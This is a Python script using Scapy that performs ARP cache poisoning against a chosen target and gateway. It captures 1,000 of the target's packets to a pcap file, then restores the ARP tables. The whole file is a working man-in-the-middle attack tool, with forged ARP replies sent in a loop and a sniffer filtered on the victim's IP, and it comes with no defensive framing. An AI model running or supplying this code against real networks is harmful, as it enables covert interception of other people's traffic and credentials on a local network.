from scapy.all import *
import sys
import threading

interface    = input("Enter Interface: ")
tgt_gateway  = input("Enter Target Gateway: ")
tgt_ip       = input("Enter Target IP: ")
packet_count = 1000
poisoning    = True

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac),count=5)  #hwdst-hardware address
 
    
def get_mac(ip_address):   
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    
    # return the MAC address from the response
    for s, r in responses:
        return r[Ether].src
    return None
    
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning 
    poison_tgt       = ARP()
    poison_tgt.op    = 2
    poison_tgt.psrc  = gateway_ip 
    poison_tgt.pdst  = target_ip
    poison_tgt.hwdst = target_mac
    
    poison_gateway       = ARP()
    poison_gateway.op    = 2
    poison_gateway.psrc  = target_ip
    poison_gateway.pdst  = gateway_ip
    poison_gateway.hwdst = gateway_mac
    
    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        send(poison_tgt)
        send(poison_gateway)        
        time.sleep(2)
    print("[*] ARP poison attack finished.")
    return             
    
    
# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print("[*] Setting up %s" % interface)

tgt_gateway_mac = get_mac(tgt_gateway)

if tgt_gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" % (tgt_gateway, tgt_gateway_mac))

tgt_mac = get_mac(tgt_ip)

if tgt_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Target %s is at %s" % (tgt_ip, tgt_mac))

# start poison thread
poison_thread = threading.Thread(target=poison_target,args=(tgt_gateway,tgt_gateway_mac,tgt_ip,tgt_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)
    bpf_filter = "ip host %s" % tgt_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    # write out the captured packets
    print("\n[*] Writing Packets to arper.pcap")
    wrpcap('/home/zeus/Desktop/arper.pcap',packets)
    
except KeyboardInterrupt:
    pass
    
finally:  
    poisoning = False   
    time.sleep(2)
    restore_target(tgt_gateway,tgt_gateway_mac,tgt_ip,tgt_mac)   
    sys.exit(0)
